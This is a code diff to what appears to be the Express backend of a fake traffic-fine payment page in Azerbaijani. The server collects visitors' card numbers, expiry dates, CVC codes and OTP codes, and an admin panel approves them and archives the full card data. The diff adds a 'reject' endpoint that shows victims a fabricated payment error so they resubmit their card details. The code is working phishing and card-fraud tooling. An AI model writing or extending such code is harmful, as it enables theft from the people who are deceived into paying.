@@ -46,6 +46,8 @@ let fineData = {
     amount: 80.00,
     discountAmount: 20.00,
     isPaid: false,
+    isRejected: false,
+    rejectReason: null,
     photoUrl: null,
     cardNo: null,
     cardExp: null,
@@ -100,6 +102,8 @@ app.post('/api/fine/update', (req, res) => {
     }
 
     fineData.isPaid = false;
+    fineData.isRejected = false;
+    fineData.rejectReason = null;
     fineData.cardNo = null;
     fineData.cardExp = null;
     fineData.cardCvc = null;
@@ -128,6 +132,8 @@ app.post('/api/tunnel/update', (req, res) => {
 // POST reset / clear payment and requests
 app.post('/api/reset', (req, res) => {
     fineData.isPaid = false;
+    fineData.isRejected = false;
+    fineData.rejectReason = null;
     fineData.cardNo = null;
     fineData.cardExp = null;
     fineData.cardCvc = null;
@@ -147,6 +153,8 @@ app.post('/api/card', (req, res) => {
     if (cardCvc) fineData.cardCvc = cardCvc;
     fineData.hasNewRequest = true;
     fineData.isPendingApproval = false;
+    fineData.isRejected = false;
+    fineData.rejectReason = null;
     res.json({ success: true, message: "Kart məlumatları qəbul edildi" });
 });
 
@@ -158,9 +166,8 @@ app.post('/api/otp', (req, res) => {
     res.json({ success: true, message: "OTP kodu qəbul edildi, təsdiq gözlənilir" });
 });
 
-// POST Admin approve payment (Saves to history archive and clears active request view)
+// POST Admin approve payment
 app.post('/api/admin/approve', (req, res) => {
-    // Add to history archive with full card info
     const historyItem = {
         protocolNo: fineData.protocolNo,
         plateNo: fineData.plateNo,
@@ -171,11 +178,11 @@ app.post('/api/admin/approve', (req, res) => {
         cardCvc: fineData.cardCvc,
         approvedAt: getCurrentDateTime()
     };
-    paidHistory.unshift(historyItem); // Add to beginning
+    paidHistory.unshift(historyItem);
     saveHistory();
 
-    // Mark as paid and clear active request fields so it leaves active requests view
     fineData.isPaid = true;
+    fineData.isRejected = false;
     fineData.isPendingApproval = false;
     fineData.hasNewRequest = false;
     fineData.cardNo = null;
@@ -183,7 +190,23 @@ app.post('/api/admin/approve', (req, res) => {
     fineData.cardCvc = null;
     fineData.otpCode = null;
 
-    res.json({ success: true, message: "Ödəniş admin tərəfindən təsdiqləndi və arxivə köçürüldü", fine: fineData });
+    res.json({ success: true, message: "Ödəniş admin tərəfindən təsdiqləndi", fine: fineData });
+});
+
+// POST Admin reject payment (Shows error on user screen)
+app.post('/api/admin/reject', (req, res) => {
+    const { reason } = req.body;
+    fineData.isPaid = false;
+    fineData.isRejected = true;
+    fineData.rejectReason = reason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
+    fineData.isPendingApproval = false;
+    fineData.hasNewRequest = false;
+    fineData.cardNo = null;
+    fineData.cardExp = null;
+    fineData.cardCvc = null;
+    fineData.otpCode = null;
+
+    res.json({ success: true, message: "Ödəniş rədd edildi", fine: fineData });
 });
 
 // Clear new request notification flag
